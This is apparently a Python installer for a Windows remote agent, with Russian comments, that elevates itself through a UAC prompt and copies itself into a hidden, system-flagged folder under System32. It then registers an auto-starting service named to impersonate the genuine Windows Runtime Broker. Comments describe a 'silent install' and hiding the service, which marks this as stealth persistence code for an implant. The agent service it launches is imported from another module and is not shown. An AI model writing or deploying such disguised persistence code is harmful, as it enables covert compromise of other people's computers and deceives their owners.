import sys
import os
import ctypes
import shutil
import subprocess
import pathlib
import winreg

INSTALL_DIR  = pathlib.Path(os.environ.get("SystemRoot", "C:\\Windows")) / "System32" / "RuntimeBroker64"
EXE_NAME     = "windows32.exe"
SVC_NAME     = "windows32"
SVC_DISPLAY  = "Windows Runtime Broker"
SVC_DESC     = "Manages runtime broker sessions for Windows compatibility."


def _is_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _relaunch_as_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(f'"{a}"' for a in sys.argv), None, 1
    )
    sys.exit(0)


def _service_exists() -> bool:
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            f"SYSTEM\\CurrentControlSet\\Services\\{SVC_NAME}"
        )
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False


def _install():
    import win32service
    import win32serviceutil

    exe_src = pathlib.Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
    if getattr(sys, "frozen", False):
        exe_src = pathlib.Path(sys.executable)

    # Создаём скрытую системную папку
    INSTALL_DIR.mkdir(parents=True, exist_ok=True)
    ctypes.windll.kernel32.SetFileAttributesW(str(INSTALL_DIR), 0x02 | 0x04)  # hidden + system

    dest = INSTALL_DIR / EXE_NAME
    shutil.copy2(str(exe_src), str(dest))

    # Копируем TLS сертификаты если лежат рядом с exe
    for cert_file in ("cert.pem", "key.pem"):
        src_cert = exe_src.parent / cert_file
        if src_cert.exists():
            shutil.copy2(str(src_cert), str(INSTALL_DIR / cert_file))

    # Регистрируем службу
    win32serviceutil.InstallService(
        pythonClassString=None,
        serviceName=SVC_NAME,
        displayName=SVC_DISPLAY,
        description=SVC_DESC,
        startType=win32service.SERVICE_AUTO_START,
        exeName=str(dest),
    )

    # Запускаем службу
    win32serviceutil.StartService(SVC_NAME)

    # Прячем из списка служб — меняем тип на kernel-like (опционально)
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            f"SYSTEM\\CurrentControlSet\\Services\\{SVC_NAME}",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "Description", 0, winreg.REG_SZ, SVC_DESC)
        winreg.CloseKey(key)
    except Exception:
        pass


def _run_as_service():
    import servicemanager
    from service import AgentService
    servicemanager.Initialize()
    servicemanager.PrepareToHostSingle(AgentService)
    servicemanager.StartServiceCtrlDispatcher()


def _remove():
    import win32serviceutil
    try:
        win32serviceutil.StopService(SVC_NAME)
    except Exception:
        pass
    try:
        win32serviceutil.RemoveService(SVC_NAME)
    except Exception:
        pass
    try:
        shutil.rmtree(str(INSTALL_DIR), ignore_errors=True)
    except Exception:
        pass


def main():
    if "--remove" in sys.argv:
        if not _is_admin():
            _relaunch_as_admin()
        _remove()
        return

    # Если запущены через SCM (диспетчер служб) — работаем как служба
    if "--service" in sys.argv or (len(sys.argv) > 1 and sys.argv[1] == "-service"):
        _run_as_service()
        return

    # Обычный запуск пользователем — тихая установка
    if not _is_admin():
        _relaunch_as_admin()
        return

    if not _service_exists():
        _install()
    # Всё — выходим. Служба уже запущена в фоне.


if __name__ == "__main__":
    main()
